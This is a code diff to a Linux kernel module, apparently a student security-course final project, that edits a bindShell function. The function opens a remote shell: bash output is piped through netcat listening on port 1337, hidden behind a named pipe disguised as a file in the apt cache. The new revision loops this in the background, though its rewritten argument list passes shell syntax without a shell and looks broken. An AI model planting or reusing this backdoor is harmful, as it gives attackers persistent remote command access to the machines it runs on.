@@ -8,7 +8,7 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Tristan Fletcher (@Cyclawps52)");
 MODULE_DESCRIPTION("CSC492 Final Project");
-MODULE_VERSION("delta-rev1");
+MODULE_VERSION("delta-rev2");
 
 // PROTOTYPES - MOVE TO .H FILE LATER
 int initModule(void);
@@ -148,8 +148,8 @@ static int makePipe(void){
 
 static int bindShell(void){
 	makePipe();
-	// cat /var/cache/apt/archives/null |sudo /bin/bash 2>&1|/bin/nc -l 1337 >/var/cache/apt/archives/null
-	char* argv[] = {"/bin/bash", "-c \"cat /var/cache/apt/archives/null |sudo /bin/bash 2>&1|/bin/nc -l 1337 >/var/cache/apt/archives/null\"", NULL};
+	// while true; do cat /var/cache/apt/archives/null | sudo /bin/bash 2>&1 |/bin/nc -l 1337 >/var/cache/apt/archives/null; done >/dev/null &
+	char* argv[] = {"while", "true;", "do", "cat", "/var/cache/apt/archives/null", "|", "/bin/bash", "2>&1", "|", "/bin/nc", "-l", "1337", ">/var/cache/apt/archives/null;", "done", ">/dev/null", "&", NULL};
 	static char* env[] = {
 		"HOME=/",
 		"TERM=linux",
